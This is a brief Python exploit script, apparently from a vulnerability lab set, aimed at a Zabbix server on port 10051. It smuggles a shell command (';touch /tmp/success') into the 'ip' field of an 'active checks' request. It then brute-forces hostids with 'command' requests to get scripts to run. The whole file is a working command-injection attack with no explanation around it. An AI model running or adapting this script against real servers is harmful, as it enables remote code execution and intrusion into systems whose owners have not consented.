import json
import socket
import sys


def send(ip, data):
    conn = socket.create_connection((ip, 10051), 10)
    conn.send(json.dumps(data).encode())
    data = conn.recv(2048)
    conn.close()
    return data


target = sys.argv[1]
print(send(target, {"request": "active checks", "host": "vulhub", "ip": ";touch /tmp/success"}))
for i in range(10000, 10500):
    data = send(target, {"request": "command", "scriptid": 1, "hostid": str(i)})
    if data and b'failed' not in data:
        print('hostid: %d' % i)
        print(data)
